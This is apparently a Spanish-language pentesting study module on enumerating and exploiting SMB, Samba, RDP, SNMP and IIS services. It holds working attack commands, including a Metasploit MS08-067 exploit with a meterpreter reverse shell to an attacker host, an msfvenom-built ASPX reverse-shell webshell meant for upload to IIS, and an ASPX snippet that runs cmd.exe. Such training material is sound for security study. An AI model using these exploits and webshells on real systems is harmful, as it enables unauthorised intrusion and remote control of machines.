
# 🧾 Enumeración y Explotación del Protocolo SMB, SAMBA, SNMP, IIS y RDP

Este módulo explora los servicios más comunes en sistemas Windows y cómo enumerarlos o explotarlos. Abarcamos SMB/SAMBA, RDP, SNMP e IIS, todos ellos vectores habituales en auditorías de red interna.

---

## 🔍 Enumeración y Explotación Básica del Protocolo SMB (Puerto 445)

### Herramientas:

```bash
nmap -p 445 --script smb-enum-shares,smb-enum-users 192.168.1.10
```

```bash
smbclient -L //192.168.1.10/ -N
```

---

## 💣 Enumeración y Explotación Básica del Protocolo SMB con Metasploit

```bash
msfconsole
use exploit/windows/smb/ms08_067_netapi
set RHOST 192.168.1.10
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
exploit
```

---

## 👥 Enumeración de Usuarios SAMBA y uso de RPCCLIENT

```bash
rpcclient -U "" 192.168.1.10
> enumdomusers
```

También puedes extraer información de grupos, políticas, controladores y más.

---

## 🖥️ Protocolo RDP en Windows y Enumeración Básica del Sistema

### Verificar si el puerto está abierto:
```bash
nmap -p 3389 192.168.1.10
```

### Conectarse desde Kali:
```bash
rdesktop 192.168.1.10
```

```bash
xfreerdp /u:usuario /p:contraseña /v:192.168.1.10
```

---

## 🛰️ Enumeración y Explotación del Protocolo SNMP

```bash
snmpwalk -v 2c -c public 192.168.1.10
```

SNMP puede revelar nombres de usuarios, servicios, software instalado y más.

---

## 🌐 Webshell ASPX en Servidor Microsoft IIS

Crear payload con `msfvenom`:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f aspx > shell.aspx
```

Sube el archivo a un servidor IIS mal configurado.

---

## 🌐 Webshell ASPX en IIS – OPCIÓN 2

Otra forma más simple usando un script `.aspx`:

```aspx
<%@ Page Language="C#" %>
<% Response.Write(System.Diagnostics.Process.Start("cmd.exe", "/c whoami")); %>
```

---

## 🛠️ Enumeración de HotFixes en Windows

Con acceso remoto:

```powershell
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

---

📌 Recomendaciones:

- Usa `enum4linux`, `smbclient`, `rpcclient` y `snmpwalk` como base.
- Nunca ignores los servicios abiertos como RDP o SNMP.
- Presta atención a los permisos de subida en IIS o recursos compartidos.

---

📚 Recursos:

- https://book.hacktricks.xyz/network-services-pentesting
- https://github.com/SecureAuthCorp/impacket
- man rpcclient, man snmpwalk, man smbclient

---

💡 “La enumeración es el arte de preguntar sin ser detectado.”
